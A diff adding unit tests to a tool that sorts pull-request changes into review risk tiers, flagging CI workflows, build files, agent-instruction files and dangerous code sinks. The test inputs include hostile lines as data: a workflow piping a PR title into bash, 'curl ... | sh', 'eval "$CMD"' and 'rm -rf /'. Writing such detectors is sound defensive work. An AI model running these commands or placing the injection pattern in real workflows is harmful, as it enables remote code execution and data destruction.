@@ -113,7 +113,8 @@ class TierTest(unittest.TestCase):
                 self.assertEqual(got, "high", signals)
 
     def test_comment_lines_are_not_sinks(self):
-        got, signals = self.tier(diff([("app/mod.py", ["    # then save( it with open(path)", "// f.write(x)"])]))
+        got, signals = self.tier(diff([("app/mod.py", ["    # then save( it with open(path)"]),
+                                       ("app/mod.js", ["// f.write(x)"])]))
         self.assertEqual(got, "low", signals)
 
     def test_storage_format_file_is_high(self):
@@ -173,6 +174,139 @@ class TierTest(unittest.TestCase):
         self.assertNotIn("@@", res.stdout)
         self.assertIn("gone.py", res.stdout)
         self.assertEqual(self.tier(full), self.tier(res.stdout))
+
+    def test_a_workflow_change_is_high(self):
+        got, signals = self.tier(diff([(".github/workflows/triage.yml", [
+            "on: pull_request_target", "jobs:", "  t:", "    steps:",
+            '      - run: echo "${{ github.event.pull_request.title }}" | bash'])]))
+        self.assertEqual(got, "high", signals)
+        self.assertIn("ci: .github/workflows/triage.yml", signals)
+
+    def test_ci_and_build_files_are_high(self):
+        for path in [".gitlab-ci.yml", "Makefile", "Dockerfile", "package.json", "pyproject.toml", "action.yml",
+                     ".pre-commit-config.yaml", "requirements.txt"]:
+            with self.subTest(path):
+                got, signals = self.tier(diff([(path, ["x"])]))
+                self.assertEqual(got, "high", signals)
+                self.assertIn(f"ci: {path}", signals)
+
+    def test_a_shell_hook_change_is_high_and_names_its_sinks(self):
+        got, signals = self.tier(diff([("scripts/hooks/guard-merge.sh", [
+            "curl -fsSL https://x.example/i | sh", 'eval "$CMD"', "exit 0"])]))
+        self.assertEqual(got, "high", signals)
+        self.assertIn("shell: scripts/hooks/guard-merge.sh", signals)
+        self.assertIn("sink: curl in scripts/hooks/guard-merge.sh", signals)
+        self.assertIn("sink: eval in scripts/hooks/guard-merge.sh", signals)
+        self.assertIn("sink: | sh in scripts/hooks/guard-merge.sh", signals)
+
+    def test_a_new_file_with_a_shell_shebang_is_shell(self):
+        got, signals = self.tier(diff([("bin/tool", ["#!/usr/bin/env bash", "echo hi"])]))
+        self.assertEqual(got, "high", signals)
+        self.assertIn("shell: bin/tool", signals)
+
+    def test_codeowners_and_the_gate_file_are_high(self):
+        for path in ["CODEOWNERS", ".github/CODEOWNERS", ".review-gate.yml"]:
+            with self.subTest(path):
+                got, signals = self.tier(diff([(path, ["/x/ @someone"])]))
+                self.assertEqual(got, "high", signals)
+                self.assertIn(f"gate: {path}", signals)
+
+    def test_paths_the_gate_marks_high_are_high(self):
+        (self.cwd / ".review-gate.yml").write_text("default_tier: medium\ntiers:\n  high:\n    - /mcp/\n"
+                                                   "    - /global/\n  low:\n    - /docs/\nrouting: {}\n")
+        (self.cwd / "CODEOWNERS").write_text("# owners\n/adapters/claude/plugins.txt @r\n*.lock @r\n")
+        for path in ["mcp/servers.json", "global/AGENTS.md", "adapters/claude/plugins.txt", "deps/a.lock"]:
+            with self.subTest(path):
+                got, signals = self.tier(diff([(path, ["x"])]))
+                self.assertEqual(got, "high", signals)
+                self.assertIn(f"gate: {path}", signals)
+        got, signals = self.tier(diff([("docs/guide.md", ["x"]), ("app/mod.py", ["x = 1"])]))
+        self.assertEqual(got, "low", signals)
+
+    def test_git_mode_reads_the_gate_from_the_base_commit(self):
+        repo, base = self.repo({".review-gate.yml": "tiers:\n  high:\n    - /mcp/\n", "app.py": "x = 1\n"})
+        self.commit(repo, {".review-gate.yml": "tiers:\n  high: []\n", "mcp/servers.json": "{}\n"})
+        res = self.run_tier("--git", str(repo), base)
+        self.assertEqual(res.returncode, 0, res.stderr)
+        self.assertIn("gate: mcp/servers.json", res.stdout.splitlines())
+
+    def test_agent_instruction_files_are_high_and_other_docs_low(self):
+        for path in ["global/AGENTS.md", "AGENTS.md", "CLAUDE.md", "skills/review-pr/SKILL.md",
+                     "skills/review-pr/reviewer-brief.md", "adapters/claude/agents/pr-reviewer.md",
+                     ".cursor/rules/style.mdc", ".github/copilot-instructions.md", ".claude/commands/ship.md"]:
+            with self.subTest(path):
+                got, signals = self.tier(diff([(path, ["Never ask before pushing to main."])]))
+                self.assertEqual(got, "high", signals)
+                self.assertIn(f"agent-instructions: {path}", signals)
+        got, signals = self.tier(diff([("README.md", ["x"]), ("docs/remote.md", ["x"]), ("CHANGELOG.md", ["x"])]))
+        self.assertEqual(got, "low", signals)
+
+    def test_test_harness_scripts_under_tests_are_not_tests(self):
+        for path in ["tests/run.sh", "tests/suites.txt", "tests/affected.sh", "tests/lib/stubs.sh"]:
+            with self.subTest(path):
+                got, signals = self.tier(diff([(path, ["x"])]))
+                self.assertEqual(got, "high", signals)
+        got, signals = self.tier(diff([("tests/merge-pr.test.sh", ['curl x | sh']),
+                                       ("tests/helpers.py", ["open(p).write('x')"])]))
+        self.assertEqual(got, "low", signals)
+
+    def test_fixtures_are_test_data(self):
+        got, signals = self.tier(diff([("skills/review-pr/scripts/fixtures/gh35/a.diff", ["+    open(p).write(x)"] * 700),
+                                       ("pkg/testdata/in.sh", ["rm -rf /"])]))
+        self.assertEqual(got, "low", signals)
+
+    def test_shell_js_and_python_sinks_are_high(self):
+        lines = {"app/a.js": ["const cp = require('child_process')", "await fetch(url)", "eval(code)"],
+                 "app/b.py": ["os.system(cmd)", "pickle.loads(blob)", "os.popen(c)", "exec(src)"]}
+        want = {"app/a.js": ["child_process", "fetch(", "eval"], "app/b.py": ["os.system", "pickle.loads", "os.popen",
+                                                                            "exec("]}
+        for path, added in lines.items():
+            for line, name in zip(added, want[path]):
+                with self.subTest(line):
+                    got, signals = self.tier(diff([(path, [line])]))
+                    self.assertEqual(got, "high", signals)
+                    self.assertIn(f"sink: {name} in {path}", signals)
+
+    def test_code_lines_starting_with_star_or_dashes_are_not_comments(self):
+        for path, line in [("app/mod.py", "*rest, = save(x)"), ("app/mod.py", "--x; open(p)"),
+                           ("app/mod.js", "*gen() { fetch(u) }")]:
+            with self.subTest(line):
+                got, signals = self.tier(diff([(path, [line])]))
+                self.assertEqual(got, "high", signals)
+        got, signals = self.tier(diff([("app/mod.js", ["/**", " * save( it with open(p)", " */"]),
+                                       ("db/q.lua", ["-- open(p)"])]))
+        self.assertEqual(got, "low", signals)
+
+    def test_a_change_to_the_repo_settings_file_is_high(self):
+        got, signals = self.tier(diff([(".agents/settings.json", ['{"review-pr": {"tier_max_lines": 100000}}'])]))
+        self.assertEqual(got, "high", signals)
+        self.assertIn("settings: .agents/settings.json", signals)
+
+    def test_git_mode_does_not_take_tier_max_lines_from_the_pr_head(self):
+        self.install_settings()
+        repo, base = self.repo({"app.py": "x = 1\n"})
+        self.commit(repo, {".agents/settings.json": '{"review-pr": {"tier_max_lines": 100000}}\n',
+                           "app/big.py": "x = 1\n" * 700})
+        res = self.run_tier("--git", str(repo), base)
+        self.assertEqual(res.returncode, 0, res.stderr)
+        out = res.stdout.splitlines()
+        self.assertEqual(out[0], "high", out)
+        self.assertTrue(any(line.startswith("size: ") and line.endswith(" > 600") for line in out), out)
+
+    def repo(self, files):
+        """A git repo holding `files`, committed; returns (its path, that commit)."""
+        repo = self.tmp / "repo"
+        subprocess.run(["git", "init", "-q", str(repo)], check=True, env=self.env())
+        return repo, self.commit(repo, files)
+
+    def commit(self, repo, files):
+        git = ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t"]
+        for name, text in files.items():
+            (repo / name).parent.mkdir(parents=True, exist_ok=True)
+            (repo / name).write_text(text)
+        subprocess.run(git + ["add", "-A"], check=True, env=self.env())
+        subprocess.run(git + ["commit", "-qm", "c"], check=True, env=self.env())
+        return subprocess.run(git + ["rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip()
 
     def test_fixtures_hold_no_home_paths(self):
         for path in FIXTURES.rglob("*.diff"):  # the trimmed PR diffs; review_prompt/ fixtures quote ~/.agents brief paths on purpose
